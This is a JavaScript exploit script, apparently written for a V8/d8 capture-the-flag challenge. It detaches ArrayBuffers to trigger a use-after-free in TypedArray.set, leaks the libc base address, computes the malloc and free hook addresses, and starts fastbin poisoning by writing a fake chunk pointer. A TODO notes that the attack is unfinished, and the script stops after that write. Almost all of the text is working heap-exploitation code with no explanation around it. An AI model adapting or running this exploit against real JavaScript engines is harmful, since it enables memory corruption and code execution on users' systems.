//TODO: fix fastbin issue
var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function gc() { for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10000); }

function ftoi(val) { 
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

function libcLeak(){
	var arr1 =  new Float64Array(0x82);
	%ArrayBufferDetach(arr1.buffer);
	var arr2 = new Float64Array(0x100);
	arr2[0] = 1.1;
	arr2.set(arr1);
	offset = 4112528n; //libc-2.27.so
	base = ftoi(arr2[1]) - offset;
	return base;
}
var libcBase = libcLeak();
var mallocHook = libcBase + 0x3ebc30n;
var freeHook = libcBase + 0x3ed8e8n;
var fakeChunk = mallocHook - 0xbn - 0x18n + 0x10n;

console.log('[+] libc base : 0x'+libcBase.toString(16));
console.log('[+] malloc hook : 0x'+mallocHook.toString(16));
console.log('[+] free hook : 0x'+freeHook.toString(16));
var arr = new Float64Array(0xc);

for(let i=0;i<0x8;i++){
	var tmp = new ArrayBuffer(0x60);
	%ArrayBufferDetach(tmp);
}
%ArrayBufferDetach(arr.buffer);
gc();
var typedarr = new Float64Array(0x1);
typedarr[0] = itof(fakeChunk);
arr.set(typedarr);
